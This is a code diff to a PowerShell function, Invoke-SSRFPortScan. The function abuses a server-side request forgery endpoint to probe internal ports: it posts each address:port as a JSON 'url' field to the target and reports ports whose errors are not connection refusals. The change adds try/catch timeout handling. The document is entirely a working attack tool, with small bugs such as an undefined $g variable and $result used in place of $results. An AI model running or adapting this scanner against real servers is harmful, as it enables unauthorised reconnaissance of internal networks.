@@ -37,27 +37,41 @@ function Invoke-SSRFPortScan() {
   [switch]$Open
   )
   $results = New-Object -TypeName "System.Collections.ArrayList"
-  for ($i = 0; $i -lt $Ports.Length; ++$i) {
-    $percent_complete = [System.Math]::Round($i / $Ports.Length * 100)
-    $port =  $Ports[$i]
-    Write-Progress -Id 1 -Activity "Current Port: $($port)" -Status "$percent_complete% Complete:" -PercentComplete $percent_complete;
+  try {
+    for ($i = 0; $i -lt $Ports.Length; ++$i) {
+      $percent_complete = [System.Math]::Round($i / $Ports.Length * 100)
+      $port =  $Ports[$i]
+      Write-Progress -Id 1 -Activity "Current Port: $($port)" -Status "$percent_complete% Complete:" -PercentComplete $percent_complete;
 
-    $internal_ip = $SSRF + ":" + $port
-    $json = @{"url" = $internal_ip} | ConvertTo-Json
+      $internal_ip = $SSRF + ":" + $port
+      $json = @{"url" = $internal_ip} | ConvertTo-Json
 
-    $res = Invoke-WebRequest -uri $target -method Post -body $json -ContentType 'application/json' -SkipHttpErrorCheck -TimeoutSec $Timeout
-    $res | Add-Member -NotePropertyName Target -NotePropertyValue $internal_ip
-    [void]$results.Add($res)
+      $res = Invoke-WebRequest -uri $target -method Post -body $json -ContentType 'application/json' -SkipHttpErrorCheck -TimeoutSec $Timeout
+      $res | Add-Member -NotePropertyName Target -NotePropertyValue $internal_ip
+      [void]$results.Add($res)
+    }
+    if($Open) {
+      foreach ($result in $results) { 
+        $table = $($result.Content | ConvertFrom-Json)
+        if($table.errors.message -notlike "*ECONNREFUSED*" ) {
+          Write-Output $result | Select-Object -property Target, StatusCode, StatusDescription, Content, RawContent, Headers, RawContentLength
+        }
+      }
+    }
+    else {
+      Write-Output $result | Select-Object -property Target, StatusCode, StatusDescription, Content, RawContent, Headers, RawContentLength
+    }   
   }
-  if($Open) {
-    foreach ($result in $results) { 
-      $table = $($result.Content | ConvertFrom-Json)
-      if($table.errors.message -notlike "*ECONNREFUSED*" ) {
-        Write-Output $result | Select-Object -property Target, StatusCode, StatusDescription, Content, RawContent, Headers, RawContentLength
+  catch {
+    foreach ($e in $Error) {
+      if($e -like '*Timeout*') {
+        Write-Output "$g : $e"
+        break
+      }
+      else {
+        Write-Output "Non-timeout related error: $e"
       }
     }
   }
-  else {
-    Write-Output $result | Select-Object -property Target, StatusCode, StatusDescription, Content, RawContent, Headers, RawContentLength
-  }
+
 }
